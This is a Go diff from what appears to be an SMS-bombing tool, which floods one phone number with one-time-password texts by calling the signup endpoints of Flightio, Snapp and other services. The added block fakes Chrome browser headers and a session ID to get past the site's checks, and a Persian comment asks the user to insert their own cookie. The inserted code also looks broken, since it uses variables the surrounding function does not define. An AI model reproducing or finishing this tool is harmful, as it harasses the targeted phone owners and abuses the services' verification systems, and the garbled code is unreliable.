@@ -128,10 +128,61 @@ ch := make(chan int)
 			"username": phone,
 		}, ch)
 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": formattedPhone, 
-			"userKeyType": 1,
-		}, ch)
+		
+	if url == "https://flightio.com/bff/Authentication/CheckUserKey" {
+		req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
+		if err != nil {
+			fmt.Println("\033[01;31m[-] Error creating request for Flightio!", err)
+			ch <- http.StatusInternalServerError
+			return
+		}
+		headers := map[string]string{
+			"Accept":          "application/json, text/javascript, text/plain, text/html, application/vnd.ms-excel",
+			"Accept-Encoding": "gzip, deflate, br, zstd",
+			"Accept-Language": "fa_IR",
+			"App-Type":        "desktop-browser",
+			"Cache-Control":   "no-cache",
+			"Client-V":        "10.30.2",
+			"Content-Length":  fmt.Sprintf("%d", len(jsonData)),
+			"Content-Type":    "application/json",
+			"Cookie":          "f-cli-id=...; ...", // کوکی کامل خود را اینجا قرار دهید
+			"Devicetype":      "Windows",
+			"F-Lang":          "fa",
+			"F-Ses-Id":        "9ca8bf75-1231-4afe-81ba-c635cae82480",
+			"Origin":          "https://flightio.com",
+			"Pragma":          "no-cache",
+			"Priority":        "u=1, i",
+			"Referer":         "https://flightio.com/",
+			"Sec-Ch-Ua":       "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
+			"Sec-Ch-Ua-Mobile": "?0",
+			"Sec-Ch-Ua-Platform": "\"Windows\"",
+			"Sec-Fetch-Dest":  "empty",
+			"Sec-Fetch-Mode":  "cors",
+			"Sec-Fetch-Site":  "same-origin",
+		}
+
+		for key, value := range headers {
+			req.Header.Set(key, value)
+		}
+
+		client := &http.Client{}
+		resp, err := client.Do(req)
+		if err != nil {
+			fmt.Println("\033[01;31m[-] Error sending request to Flightio!", err)
+			ch <- http.StatusInternalServerError
+			return
+		}
+		defer resp.Body.Close()
+
+		fmt.Println("Flightio Status Code:", resp.StatusCode)
+		bodyBytes, err := ioutil.ReadAll(resp.Body)
+		if err != nil {
+			fmt.Println("Error reading Flightio response body:", err)
+			return
+		}
+		fmt.Println("Flightio Response Body:", string(bodyBytes))
+		ch <- resp.StatusCode
+	} 
 		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp", map[string]interface{}{
 			"cellphone": phone,
 		}, ch)
